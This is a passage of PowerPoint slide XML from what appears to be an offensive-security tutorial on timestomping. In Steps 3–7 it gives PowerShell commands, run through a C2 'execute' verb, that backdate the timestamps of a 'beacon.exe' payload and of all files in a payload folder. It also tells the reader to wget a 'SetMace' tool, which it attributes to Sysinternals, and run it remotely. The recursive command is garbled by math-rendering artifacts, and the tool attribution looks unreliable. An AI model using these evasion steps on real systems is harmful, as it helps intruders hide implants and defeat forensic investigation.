              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 3: View Current File Timestamps (Before </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Timestomp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Check the current creation and modification dates of your payload:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-Item C:\payload\beacon.exe | Select-Object Name, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>CreationTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LastWriteTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LastAccessTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Note the current dates (e.g., today's date).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 4: Reset File Timestamps to an Older Date (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Timestomp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Set the creation time to January 1, 2018, at 00:00:00:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "(Get-Item 'C:\payload\beacon.exe').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>CreationTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> = '2018-01-01 00:00:00'"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Set the last modified time to January 1, 2018, at 00:00:00:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "(Get-Item 'C:\payload\beacon.exe').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LastWriteTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> = '2018-01-01 00:00:00'"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Set the last access time to January 1, 2018, at 00:00:00:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "(Get-Item 'C:\payload\beacon.exe').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LastAccessTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> = '2018-01-01 00:00:00’” </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 5: Verify Timestamps Have Been Changed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Check the timestamps again:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-Item C:\payload\beacon.exe | Select-Object Name, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>CreationTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LastWriteTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LastAccessTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>All timestamps should now show 2018-01-01.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40792065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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 6: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Timestomp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> All Files in the Payload Folder (Recursive)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>If you have multiple files, loop through the entire folder:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ChildItem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -Path C:\payload -Recurse | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ForEach</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>-Object { </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>CreationTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>=′2018−01−0100:00:00′;.​</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>CreationTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>=′2018−01−0100:00:00′;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>.LastWriteTime = '2018-01-01 00:00:00'; $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>LastAccessTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> = '2018-01-01 00:00:00’ }”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 7: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Timestomp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> Using a Third-Party Tool (Alternative)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>If you want more control, use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Sysinternals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> tool </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>SetMace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> (Set MAC timestamps). Download it and run remotely.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Download </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>SetMace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> on Kali:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" u="none" strike="noStrike" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
                <a:hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://live.sysinternals.com/SetMace.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
